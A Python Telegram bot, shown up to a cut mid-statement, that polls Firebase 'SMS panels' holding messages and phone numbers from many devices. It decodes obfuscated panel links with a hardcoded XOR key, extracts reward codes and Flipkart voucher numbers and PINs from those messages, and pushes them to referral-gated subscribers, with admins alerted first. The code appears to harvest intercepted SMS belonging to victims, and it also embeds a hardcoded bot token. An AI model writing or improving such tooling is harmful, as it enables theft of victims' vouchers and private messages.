"""
SMS Panel Monitor — Full Featured
==================================
- Accepts encoded panel links AND raw Firebase URLs
- Channel join gate (3 channels required)
- Refer system: 3 refers = 1 hour access
- Admins get alerts 10s earlier (silent)
- Admin-only panel management + Give Time to members
- Broadcast to all authorized users
"""

import asyncio
import json
import os
import re
import sys
import time
import base64
import logging
import httpx
from datetime import datetime
from pathlib import Path
from urllib.parse import parse_qs, urlparse

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.error import TelegramError

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8646908060:AAGzfWQcu6vDIXKbZTgYuJ-e0ueIHcAOqN8")
ADMIN_IDS = {1446058092, 6894923643}

REQUIRED_CHANNELS = [
    {"username": "blankkdealz",     "url": "https://t.me/blankkdealz",      "label": "📢 Blank Dealz"},
    {"username": "earnwithsakx",    "url": "https://t.me/earnwithsakx",     "label": "💰 Earn With Sakx"},
    {"username": "blankdealzzchat", "url": "https://t.me/blankdealzzchat",  "label": "💬 Blank Dealz Chat"},
]

ADMIN_ALERT_DELAY   = 10    # seconds admins receive alerts BEFORE members
MONITOR_INTERVAL    = 15    # seconds between monitor cycles
REFERRALS_FOR_1H    = 3     # referrals needed for 1 hour access
ACCESS_HOURS        = 1     # hours granted per referral milestone

STATE_FILE  = Path(__file__).parent / "bot_state.json"
USERS_FILE  = Path(__file__).parent / "users.json"
PANELS_FILE = Path(__file__).parent / "panels.json"

MAX_CONCURRENT_REQUESTS = 30
IS_INITIALIZED = False

# BUG FIX: semaphore must be created inside the running event loop.
# We create it lazily on first use instead of at module level.
_semaphore: asyncio.Semaphore | None = None

def get_semaphore() -> asyncio.Semaphore:
    global _semaphore
    if _semaphore is None:
        _semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    return _semaphore

# ── Message Patterns ──────────────────────────────────────────────────────────
REWARD_ONAM_PATTERN     = re.compile(r"Reward Code for\s+Ujala\s+\w+ Consumer promo is ([A-Z0-9]+)", re.IGNORECASE)
REWARD_FLIPKART_PATTERN = re.compile(r"Flipkart Gift Voucher is ([0-9]+)\s+PIN:\s+([0-9]+)", re.IGNORECASE)
REWARD_GENERIC_PATTERN  = re.compile(r"(?:promo|reward|code|voucher)\s+(?:is|:)\s+([A-Z0-9]{6,25})", re.IGNORECASE)

# ── JSON helpers ──────────────────────────────────────────────────────────────
def load_json(path, default):
    if path.exists():
        try:
            with open(path, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading {path}: {e}")
    return default

def save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving {path}: {e}")

def load_panels():  return load_json(PANELS_FILE, {})
def save_panels(p): save_json(PANELS_FILE, p)
def load_state():   return load_json(STATE_FILE, {})
def save_state(s):  save_json(STATE_FILE, s)

# ── User management ───────────────────────────────────────────────────────────
# users.json schema:
# { "123456": { "username": "...", "access_expiry": 0, "referrals_given": 0,
#               "referred_by": null, "joined_at": 0 } }

def load_users() -> dict:
    return load_json(USERS_FILE, {})

def save_users(u: dict):
    save_json(USERS_FILE, u)

def get_user(uid: int) -> dict | None:
    return load_users().get(str(uid))

def upsert_user(uid: int, **kwargs):
    users = load_users()
    key   = str(uid)
    if key not in users:
        users[key] = {
            "username":       "",
            "access_expiry":  0,
            "referrals_given": 0,
            "referred_by":    None,
            "joined_at":      int(time.time()),
        }
    users[key].update(kwargs)
    save_users(users)
    return users[key]

def has_access(uid: int) -> bool:
    if uid in ADMIN_IDS:
        return True
    u = get_user(uid)
    if not u:
        return False
    return u.get("access_expiry", 0) > time.time()

def grant_access_hours(uid: int, hours: int = ACCESS_HOURS) -> float:
    u   = get_user(uid)
    now = time.time()
    current_expiry = u.get("access_expiry", now) if u else now
    new_expiry     = max(current_expiry, now) + hours * 3600
    upsert_user(uid, access_expiry=new_expiry)
    return new_expiry

def get_all_user_ids() -> list[int]:
    return [int(k) for k in load_users().keys()]

# ── Channel membership check ──────────────────────────────────────────────────
async def check_channels(bot, uid: int) -> list[dict]:
    """Returns list of channels the user has NOT joined yet."""
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(f"@{ch['username']}", uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except TelegramError:
            not_joined.append(ch)
    return not_joined

def channel_join_keyboard(not_joined: list[dict]) -> InlineKeyboardMarkup:
    buttons = [[InlineKeyboardButton(ch["label"], url=ch["url"])] for ch in not_joined]
    buttons.append([InlineKeyboardButton("✅ I've Joined — Check", callback_data="check_join")])
    return InlineKeyboardMarkup(buttons)

# ── Decoders ──────────────────────────────────────────────────────────────────
def decode_zxkai(s: str):
    try:
        b64    = s.replace("-", "+").replace("_", "/")
        padded = b64 + "=" * ((4 - len(b64) % 4) % 4)
        bin_data = base64.b64decode(padded)
        K   = "ZXKAIv1_Xk9mP2wN7qL4vR6jH3cF8yT1ZbE5sA09"
        dec = bytearray(bin_data[i] ^ ord(K[i % len(K)]) for i in range(len(bin_data)))
        obj = json.loads(dec.decode("utf-8"))
        if obj.get("u") and obj.get("k"):
            return obj["u"], obj["k"]
    except Exception:
        pass
    return None, None

def decode_profex(s: str):
    # BUG FIX: was appending "==" unconditionally which breaks links whose
    # length already gives valid padding — now we compute exact padding needed.
    try:
        padded  = s + "=" * ((4 - len(s) % 4) % 4)
        decoded = base64.b64decode(padded).decode("utf-8")
        if "|||" in decoded:
            parts = decoded.split("|||")
            return parts[0], (parts[1] if len(parts) > 1 else "")
    except Exception:
        pass
    return None, None

def get_panel_api_url(panel_url: str):
    """
    Extract (api_url, auth_key) from any of:
      1. ZXKAI encoded   — ?s=<xor-base64>
      2. Profex encoded  — ?s=<base64-with-|||>
      3. Raw Firebase    — https://xxx.firebaseio.com  (no ?s param)
      4. Firebase + auth — https://xxx.firebaseio.com?auth=KEY
    """
    # ── Direct raw Firebase URL (no encoded s param) ──────────────────────────
    if ".firebaseio.com" in panel_url and "?s=" not in panel_url:
        url    = panel_url.split("?")[0].split(".json")[0].rstrip("/")
        parsed = urlparse(panel_url)
        qs     = parse_qs(parsed.query)
        auth_key = ""
        for k, v in qs.items():
            if k.lower() in ("key", "auth", "secret"):
                auth_key = v[0]
                break
        return url, auth_key

    parsed  = urlparse(panel_url)
    qs      = parse_qs(parsed.query)
    s_param = qs.get("s", [""])[0]

    url, key = decode_zxkai(s_param)
    if url:
        return url.rstrip("/"), key

    url, key = decode_profex(s_param)
    if url:
        return url.rstrip("/"), key

    # ── Plain Firebase with a ?s param that didn't decode ─────────────────────
    if ".firebaseio.com" in parsed.netloc:
        url = panel_url.split("?")[0].split(".json")[0].rstrip("/")
        auth_key = ""
        for k, v in qs.items():
            if k.lower() in ("key", "auth", "secret"):
                auth_key = v[0]
                break
        return url, auth_key

    return None, None

# ── Firebase API helpers ──────────────────────────────────────────────────────
async def api_fetch(client, url, timeout=15):
    async with get_semaphore():
        try:
            resp = await client.get(url, timeout=timeout)
            if resp.status_code == 200:
                return resp.json(), None
            return None, f"HTTP {resp.status_code}"
        except Exception as e:
            return None, str(e)

def is_valid_device_id(k):
    if not isinstance(k, str):
        return False
    if k.lower() in ("messages", "clients", "devices", "users", "all_devices",
                     "nodes", "settings", "sms", "logs"):
        return False
    return 8 <= len(k) <= 45

async def discover_structure(client, api_url, auth_key):
    auth_qs = f"?auth={auth_key}" if auth_key else ""
    # BUG FIX: was missing leading slash before .json on sub-node fetches
    root_data, error = await api_fetch(client, f"{api_url}/.json{auth_qs}&shallow=true")
    if root_data and isinstance(root_data, dict):
        keys       = list(root_data.keys())
        device_ids = [k for k in keys if is_valid_device_id(k)]
        if device_ids:
            for m_node in ("messages", "sms", "logs"):
                if m_node in keys:
                    return "", m_node
            return "", ""
        for node in ("clients", "devices", "users", "all_devices", "nodes"):
            if node in keys:
                # BUG FIX: was "{api_url}/{node}.json" — missing "/" before .json
                node_data, _ = await api_fetch(
                    client, f"{api_url}/{node}/.json{auth_qs}&shallow=true"
                )
                if node_data and isinstance(node_data, dict):
                    if any(is_valid_device_id(k) for k in node_data.keys()):
                        msg_node = node
                        for m_node in ("messages", "sms", "logs"):
                            if m_node in keys:
                                msg_node = m_node
                                break
                        return node, msg_node
    return None, error

async def get_device_list(client, api_url, auth_key, device_node):
    auth_qs = f"?auth={auth_key}" if auth_key else ""
    path    = f"/{device_node}" if device_node else ""
    url     = f"{api_url}{path}/.json{auth_qs}&shallow=true"
    data, error = await api_fetch(client, url, 15)
    if error:
        return None, error
    if not data or not isinstance(data, dict):
        return [], None
    return [k for k in data.keys() if is_valid_device_id(k)], None

async def get_messages(client, api_url, auth_key, message_node, device_id, limit=5) -> dict:
    auth_qs = f"&auth={auth_key}" if auth_key else ""
    path    = f"/{message_node}" if message_node else ""
    url     = f'{api_url}{path}/{device_id}/.json?orderBy="%24key"&limitToLast={limit}{auth_qs}'
    data, _ = await api_fetch(client, url, 15)
    return data or {}

async def get_device_number(client, api_url, auth_key, device_node, device_id) -> str:
    auth_qs = f"?auth={auth_key}" if auth_key else ""
    path    = f"/{device_node}" if device_node else ""
    url     = f"{api_url}{path}/{device_id}/.json{auth_qs}"
    data, _ = await api_fetch(client, url, 10)
    if isinstance(data, dict):
        for field in ("number", "phoneNumber", "phone", "fromNumber", "to", "sim_number"):
            if field in data and data[field]:
                return str(data[field])
        for nested in ("webhookEvent", "info", "details"):
            if nested in data and isinstance(data[nested], dict):
                d = data[nested]
                for f in ("number", "phone", "to", "sendSms"):
                    if f in d:
                        val = d[f]
                        if isinstance(val, dict) and "to" in val:
                            return str(val["to"])
                        if isinstance(val, str):
                            return val
    return ""

# ── Message classification ────────────────────────────────────────────────────
def classify_message(text: str):
    m = REWARD_ONAM_PATTERN.search(text)
    if m:
        return "onam", m.group(1)
    m = REWARD_FLIPKART_PATTERN.search(text)
    if m:
        return "flipkart", (m.group(1), m.group(2))
    m = REWARD_GENERIC_PATTERN.search(text)
    if m:
        return "generic", m.group(1)
    return None, None

# ── Alert formatting ──────────────────────────────────────────────────────────
def format_reward(device_id, sender, message, reward_data,
                  panel_name, msg_type, number="", dt="") -> str:
    if msg_type == "onam":
        code_text = f"🎁 *Reward Code:* `{reward_data}`"
    elif msg_type == "flipkart":
        voucher, pin = reward_data
        code_text = f"🎁 *Voucher:* `{voucher}`\n🔑 *PIN:* `{pin}`"
    elif msg_type == "generic":
        code_text = f"🎁 *Code:* `{reward_data}`"
    else:
        code_text = ""

    num_line = f"🔢 *Number:* `{number}`\n" if number else ""
    return (
        f"🚨 *REWARD ALERT*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 *Panel:* {panel_name}\n"
        f"📲 *Device:* `{device_id}`\n"
        f"{num_line}"
        f"📨 *From:* {sender}\n"
        f"⏰ *Time:* {dt}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{code_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 *Message:*\n{message}\n"
    )

# ── Broadcast with admin-first delay ─────────────────────────────────────────
async def _do_broadcast_alert(app, text: str):
    """
    Internal: admins first, then 10s silent wait, then members.
    BUG FIX: this is now run as a fire-and-forget task (create_task) so it
    does NOT block the monitor loop for 10 seconds per reward found.
    """
    all_uids = get_all_user_ids()

    # Step 1: Admins immediately
    for uid in ADMIN_IDS:
        try:
            await app.bot.send_message(
                chat_id=uid, text=text,
                parse_mode="Markdown", disable_web_page_preview=True,
            )
        except Exception as e:
            logger.error(f"Admin alert error [{uid}]: {e}")

    # Step 2: Silent wait (members don't know)
    await asyncio.sleep(ADMIN_ALERT_DELAY)

    # Step 3: Authorized non-admin members
    for uid in all_uids:
        if uid in ADMIN_IDS:
            continue
        if not has_access(uid):
            continue
        try:
            await app.bot.send_message(
                chat_id=uid, text=text,
                parse_mode="Markdown", disable_web_page_preview=True,
            )
        except Exception as e:
            logger.error(f"Member alert error [{uid}]: {e}")

def broadcast_alert(app, text: str):
    """Fire-and-forget — returns immediately, alert runs in background."""
    asyncio.create_task(_do_broadcast_alert(app, text))

# ── Monitor job ───────────────────────────────────────────────────────────────
async def process_device(client, panel_key, panel_config,
                         device_id, state, app, is_new_panel):
    api_url    = panel_config.get("api_url")
    auth_key   = panel_config.get("auth_key", "")
    msg_node   = panel_config.get("message_node", "")
    dev_node   = panel_config.get("device_node", "")
    panel_name = panel_config.get("name", "Unknown")
    new_sent   = 0

    try:
        messages = await get_messages(client, api_url, auth_key, msg_node, device_id, limit=5)
        if not messages:
            return 0

        for msg_key, msg_data in messages.items():
            if not isinstance(msg_data, dict):
                continue

            msg_id   = str(msg_data.get("id", msg_key))
            full_key = f"{panel_key}:{device_id}:{msg_id}"

            if state.get(full_key):
                continue

            # On first run or newly added panel — mark as seen, don't alert
            if not IS_INITIALIZED or is_new_panel:
                state[full_key] = True
                continue

            message_text = ""
            for f in ("message", "body", "text", "msg", "SMS"):
                if f in msg_data:
                    message_text = msg_data[f]
                    break

            sender = "Unknown"
            for f in ("sender", "from", "address", "number"):
                if f in msg_data:
                    sender = msg_data[f]
                    break

            dt = msg_data.get("dateTime", msg_data.get("time", ""))

            if not message_text:
                continue

            msg_type, reward_data = classify_message(str(message_text))
            if not msg_type:
                state[full_key] = True
                continue

            number = await get_device_number(client, api_url, auth_key, dev_node, device_id)
            text   = format_reward(device_id, sender, message_text, reward_data,
                                   panel_name, msg_type, number, dt)

            # BUG FIX: don't await — fire-and-forget so monitor loop isn't
            # blocked for 10 seconds (ADMIN_ALERT_DELAY) per reward found.
            broadcast_alert(app, text)
            state[full_key] = True
            new_sent += 1

    except Exception as e:
        # BUG FIX: was bare `except: pass` — now logs so failures are visible
        logger.error(f"process_device error [{panel_key}/{device_id}]: {e}")

    return new_sent

async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
    global IS_INITIALIZED
    app    = context.application
    panels = load_panels()
    state  = load_state()

    total_new          = 0
    any_new_panel_init = False

    async with httpx.AsyncClient() as client:
        for panel_key, panel_config in list(panels.items()):
            api_url  = panel_config.get("api_url")
            if not api_url:
                continue

            auth_key     = panel_config.get("auth_key", "")
            init_key     = f"init:{panel_key}"
            is_new_panel = not state.get(init_key, False)

            try:
                if panel_config.get("device_node") is None:
                    dev_node, msg_node = await discover_structure(client, api_url, auth_key)
                    if dev_node is not None:
                        panel_config["device_node"] = dev_node
                        panel_config["message_node"] = msg_node
                        save_panels(panels)
                    else:
                        continue

                dev_node   = panel_config.get("device_node")
                device_ids, error = await get_device_list(client, api_url, auth_key, dev_node)

                if not device_ids:
                    if is_new_panel:
                        state[init_key] = True
                    continue

                tasks = [
                    process_device(client, panel_key, panel_config,
                                   device_id, state, app, is_new_panel)
                    for device_id in device_ids
                ]
                results    = await asyncio.gather(*tasks)
                total_new += sum(results)

                if is_new_panel:
                    state[init_key]    = True
                    any_new_panel_init = True

            except Exception as e:
                logger.error(f"Monitor error [{panel_key}]: {e}")

    if not IS_INITIALIZED:
        IS_INITIALIZED = True
        save_state(state)
        logger.info("Bot initialized — monitoring active.")
        return

    if total_new > 0 or any_new_panel_init:
        save_state(state)

# ── Access gate (non-admin handlers) ─────────────────────────────────────────
async def gate_user(update: Update, bot) -> bool:
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        return True

    not_joined = await check_channels(bot, uid)
    if not_joined:
        kb = channel_join_keyboard(not_joined)
        await update.effective_message.reply_text(
            "📢 *Bot use karne ke liye pehle in channels ko join karo:*",
            parse_mode="Markdown",
            reply_markup=kb,
        )
        return False

    if not has_access(uid):
        u      = get_user(uid)
        refs   = u.get("referrals_given", 0) if u else 0
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        bot_info = await bot.get_me()
        await update.effective_message.reply_text(
            f"⛔ *Access expired ya nahi hai.*\n\n"
            f"🔗 *Refer karke access pao:*\n"
            f"Har 3 referrals = 1 ghante ka access\n\n"
            f"Tumhara referral link:\n"
            f"`https://t.me/{bot_info.username}?start=r{uid}`\n\n"
            f"Current referrals: `{refs}`\n"
            f"Aur `{needed}` refer karo = 1 ghanta access",
            parse_mode="Markdown",
        )
        return False

    return True

# ── /start ────────────────────────────────────────────────────────────────────
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid      = update.effective_user.id
    username = update.effective_user.username or ""
    args     = context.args or []

    # Register / update user record
    upsert_user(uid, username=username)

    # ── Handle referral arg ───────────────────────────────────────────────────
    if args and args[0].startswith("r"):
        try:
            referrer_id = int(args[0][1:])
            if referrer_id != uid:
                u = get_user(uid)
                # Only credit once per referred user
                if u and u.get("referred_by") is None:
                    upsert_user(uid, referred_by=referrer_id)
                    ref_data = get_user(referrer_id)
                    if ref_data is not None:
                        old_refs = ref_data.get("referrals_given", 0)
                        new_refs = old_refs + 1
                        upsert_user(referrer_id, referrals_given=new_refs)
                        # Every REFERRALS_FOR_1H referrals grants access
                        if new_refs % REFERRALS_FOR_1H == 0:
                            expiry  = grant_access_hours(referrer_id, ACCESS_HOURS)
                            exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m")
                            try:
                                await context.bot.send_message(
                                    chat_id=referrer_id,
                                    text=(
                                        f"🎉 *Congratulations!*\n\n"
                                        f"Tumhare {new_refs} referrals ho gaye!\n"
                                        f"✅ *1 ghante ka access mil gaya!*\n"
                                        f"Expires: `{exp_str}`"
                                    ),
                                    parse_mode="Markdown",
                                )
                            except Exception:
                                pass
                        else:
                            # Notify referrer of progress
                            remaining = REFERRALS_FOR_1H - (new_refs % REFERRALS_FOR_1H)
                            try:
                                await context.bot.send_message(
                                    chat_id=referrer_id,
                                    text=(
                                        f"👥 *New referral!*\n\n"
                                        f"Total: {new_refs} | "
                                        f"Aur {remaining} chahiye access ke liye"
                                    ),
                                    parse_mode="Markdown",
                                )
                            except Exception:
                                pass
        except (ValueError, IndexError):
            pass

    # ── Channel gate ──────────────────────────────────────────────────────────
    if uid not in ADMIN_IDS:
        not_joined = await check_channels(context.bot, uid)
        if not_joined:
            kb = channel_join_keyboard(not_joined)
            await update.message.reply_text(
                "👋 *Welcome!*\n\n"
                "📢 Pehle in channels ko join karo, phir bot use kar sakte ho:",
                parse_mode="Markdown",
                reply_markup=kb,
            )
            return

    await show_main_menu(update, context)

# ── Main menu ─────────────────────────────────────────────────────────────────
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid      = update.effective_user.id
    is_admin = uid in ADMIN_IDS

    if is_admin:
        keyboard = ReplyKeyboardMarkup(
            [["📊 Status",    "📋 My Panels"],
             ["➕ Add Panel", "❌ Remove Panel"],
             ["👥 Users",     "📨 Broadcast"],
             ["⏱ Give Time"]],
            resize_keyboard=True,
        )
        role = "👑 *Admin*"
    else:
        keyboard = ReplyKeyboardMarkup(
            [["📊 Status",   "🔗 My Referral"],
             ["⏳ My Access"]],
            resize_keyboard=True,
        )
        role = "👤 *Member*"

    bot_info = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"

    u      = get_user(uid)
    refs   = u.get("referrals_given", 0) if u else 0
    expiry = u.get("access_expiry", 0) if u else 0

    if uid in ADMIN_IDS:
        access_str = "♾ Unlimited (Admin)"
    elif expiry > time.time():
        exp_str    = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        access_str = f"✅ Active till {exp_str}"
    else:
        needed     = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        access_str = f"⛔ None  |  {needed} more refer needed"

    await update.effective_message.reply_text(
        f"🤖 *SMS Panel Monitor*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Role: {role}\n"
        f"Access: {access_str}\n"
        f"Referrals: {refs}\n"
        f"🔗 Your link: `{ref_link}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Chat ID: `{uid}`",
        parse_mode="Markdown",
        reply_markup=keyboard,
    )

# ── Check join callback ───────────────────────────────────────────────────────
async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    not_joined = await check_channels(context.bot, uid)
    if not_joined:
        kb = channel_join_keyboard(not_joined)
        await query.edit_message_text(
            "❌ *Abhi bhi kuch channels join nahi kiye:*",
            parse_mode="Markdown",
            reply_markup=kb,
        )
    else:
        # BUG FIX: was telling user to press /start again — now shows menu directly
        await query.edit_message_text(
            "✅ *Sab channels join ho gaye! Welcome!*",
            parse_mode="Markdown",
        )
        await show_main_menu(update, context)

# ── Status ────────────────────────────────────────────────────────────────────
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate_user(update, context.bot):
        return

    panels = load_panels()
    users  = load_users()
    text   = "📊 *Monitor Status*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    total_devices = 0

    async with httpx.AsyncClient() as client:
        for panel_key, panel_config in panels.items():
            api_url      = panel_config.get("api_url")
            auth_key     = panel_config.get("auth_key", "")
            # BUG FIX: escape panel name for Markdown to prevent parse errors
            panel_name   = (panel_config.get("name", "Unknown")
                            .replace("*", "").replace("_", "").replace("`", ""))
            device_count = 0

            if not api_url:
                status = "🔴 Link Error"
            else:
                try:
                    dev_node = panel_config.get("device_node")
                    if dev_node is None:
                        dev_node, _ = await discover_structure(client, api_url, auth_key)
                    if dev_node is not None:
                        device_ids, error = await get_device_list(
                            client, api_url, auth_key, dev_node
                        )
                        if error:
                            status = f"🔴 {error[:25]}"
                        else:
                            device_count   = len(device_ids)
                            total_devices += device_count
                            status = "🟢 Active" if device_count > 0 else "🟡 No Devices"
                    else:
                        status = "🔴 Structure Error"
                except Exception as e:
                    status = f"🔴 {str(e)[:25]}"

            text += f"*{panel_name}*\nStatus: {status} | Devices: {device_count}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    now          = time.time()
    active_users = sum(
        1 for uid_s, u in users.items()
        if int(uid_s) in ADMIN_IDS or u.get("access_expiry", 0) > now
    )
    text += f"\n📦 Total Devices: {total_devices}\n👥 Total Users: {len(users)} | Active: {active_users}"
    await update.message.reply_text(text, parse_mode="Markdown")

# ── My panels (admin) ─────────────────────────────────────────────────────────
async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    panels = load_panels()
    if not panels:
        await update.message.reply_text("❌ Koi panel nahi hai.")
        return
    text = "📋 *My Panels*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, (pk, pc) in enumerate(panels.items(), 1):
        url_display = pc.get("panel_url", "")[:45]
        text += f"*{i}. {pc.get('name')}*\n   `{url_display}...`\n\n"
    await update.message.reply_text(text, parse_mode="Markdown")

# ── Add panel (admin) ─────────────────────────────────────────────────────────
async def handle_add_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    await update.message.reply_text(
        "➕ *Add New Panels*\n\n"
        "Links bhejein (har link nayi line par).\n\n"
        "Supported formats:\n"
        "• Encoded: `http://profex.site.je/?s=...`\n"
        "• Raw Firebase: `https://xxx-default-rtdb.firebaseio.com`",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_url"] = True

# ── Remove panel (admin) ──────────────────────────────────────────────────────
async def handle_remove_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    panels = load_panels()
    if not panels:
        await update.message.reply_text("❌ Koi panel nahi hai.")
        return
    text        = "❌ *Remove Panel*\n\n"
    panels_list = []
    for i, (pk, pc) in enumerate(panels.items(), 1):
        text += f"{i}. {pc.get('name')}\n"
        panels_list.append(pk)
    text += "\nNumber bhejo."
    context.user_data["awaiting_remove"] = True
    context.user_data["panels_list"]     = panels_list
    await update.message.reply_text(text, parse_mode="Markdown")

# ── Give Time (admin) ─────────────────────────────────────────────────────────
async def handle_give_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    await update.message.reply_text(
        "⏱ *Give Access Time*\n\n"
        "Is format mein bhejo:\n"
        "`<user_id> <hours>`\n\n"
        "Example: `123456789 2`\n"
        "(2 ghante dega us user ko)\n\n"
        "User ID Users list mein milega 👥",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_give_time"] = True

# ── My Referral ───────────────────────────────────────────────────────────────
async def my_referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate_user(update, context.bot):
        return
    uid      = update.effective_user.id
    u        = get_user(uid)
    refs     = u.get("referrals_given", 0) if u else 0
    bot_info = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
    next_milestone = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
    await update.message.reply_text(
        f"🔗 *Your Referral Info*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total Referrals: *{refs}*\n"
        f"Next 1h access in: *{next_milestone}* more referral(s)\n\n"
        f"📲 Your Link:\n`{ref_link}`\n\n"
        f"ℹ️ Har 3 referrals = 1 ghante ka access!\n"
        f"Share karo aur access badhao 🚀",
        parse_mode="Markdown",
    )

# ── My Access ─────────────────────────────────────────────────────────────────
async def my_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u   = get_user(uid)

    if uid in ADMIN_IDS:
        await update.message.reply_text("♾ *Admin — Unlimited access!*", parse_mode="Markdown")
        return

    expiry = u.get("access_expiry", 0) if u else 0
    refs   = u.get("referrals_given", 0) if u else 0

    if expiry > time.time():
        remaining    = int(expiry - time.time())
        hours, rem   = divmod(remaining, 3600)
        mins         = rem // 60
        exp_str      = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        text = (
            f"✅ *Access Active*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Expires at: `{exp_str}`\n"
            f"Remaining: `{hours}h {mins}m`\n"
            f"Total referrals: `{refs}`"
        )
    else:
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        text = (
            f"⛔ *No Active Access*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Total referrals: `{refs}`\n"
            f"Aur *{needed}* referral(s) karo = 1 ghante ka access\n\n"
            f"Apna referral link pane ke liye /start karo."
        )
    await update.message.reply_text(text, parse_mode="Markdown")

# ── Users list (admin) ────────────────────────────────────────────────────────
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    users = load_users()
    now   = time.time()
    active = [
        (uid, u) for uid, u in users.items()
        if int(uid) in ADMIN_IDS or u.get("access_expiry", 0) > now
    ]
    text = (
        f"👥 *Users Overview*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total registered: {len(users)}\n"
        f"Active access: {len(active)}\n\n"
    )
    for uid_str, u in list(users.items())[:30]:
        uid_int = int(uid_str)
        uname   = u.get("username") or uid_str
        refs    = u.get("referrals_given", 0)
        if uid_int in ADMIN_IDS:
            acc = "👑 Admin"
        elif u.get("access_expiry", 0) > now:
            exp = datetime.fromtimestamp(u["access_expiry"]).strftime("%d/%m %H:%M")
            acc = f"✅ till {exp}"
        else:
            acc = "⛔ None"
        text += f"• `{uid_str}` @{uname} | refs:{refs} | {acc}\n"
    if len(users) > 30:
        text += f"\n...and {len(users)-30} more."
    await update.message.reply_text(text, parse_mode="Markdown")

# ── Broadcast (admin) ─────────────────────────────────────────────────────────
async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    await update.message.reply_text(
        "📨 *Broadcast Message*\n\nMessage bhejo (sab active users ko jayega):",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_broadcast"] = True

# ── Text message router ───────────────────────────────────────────────────────
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    uid  = update.effective_user.id

    # ── Add panel flow ────────────────────────────────────────────────────────
    if context.user_data.get("awaiting_url"):
        context.user_data.pop("awaiting_url")
        if uid not in ADMIN_IDS:
            await update.message.reply_text("⛔ Admin only.")
            return

        links = [line.strip() for line in text.split("\n") if line.strip()]
        if not links:
            await update.message.reply_text("❌ Link nahi mila.")
            return

        panels        = load_panels()
        added         = 0
        dupes         = 0
        failed        = []
        existing_urls = {
            pc.get("api_url", "").rstrip("/").lower()
            for pc in panels.values()
        }

        async with httpx.AsyncClient() as client:
            for link in links:
                if not link.startswith("http"):
                    failed.append(link[:40])
                    continue
                api_url, auth_key = get_panel_api_url(link)
                if not api_url:
                    failed.append(link[:40])
                    continue

                normalised = api_url.rstrip("/").lower()
                if normalised in existing_urls:
                    dupes += 1
                    continue

                dev_node, msg_node = await discover_structure(client, api_url, auth_key)
                pid = f"p_{int(time.time())}_{added}_{len(panels)}"
                panels[pid] = {
                    "name":         f"Panel {len(panels)+1}",
                    "api_url":      api_url,
                    "auth_key":     auth_key,
                    "device_node":  dev_node,
                    "message_node": msg_node,
                    "panel_url":    link,
